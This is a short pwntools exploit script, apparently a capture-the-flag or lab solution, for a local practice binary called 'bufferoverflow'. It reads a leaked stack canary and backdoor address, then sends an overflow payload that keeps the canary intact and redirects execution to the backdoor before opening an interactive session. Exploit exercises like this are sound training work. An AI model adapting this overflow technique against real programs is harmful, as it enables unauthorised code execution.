from pwn import *
context.terminal=['tmux','split','-h']
context.arch='amd64'
p = process("./bufferoverflow")
#gdb.attach(p)
p.readuntil(": ")
backdoor = int(p.readline(),16)
p.readuntil(": ")
Canary = int(p.readline(),16)
log.warning(hex(backdoor))
log.warning(hex(Canary))
payload = b'\0'*0x20 + flat(
    [0xdeadbeef,Canary,0xdeadbeef,0x1b+backdoor,backdoor]
)
p.send(payload)
p.interactive()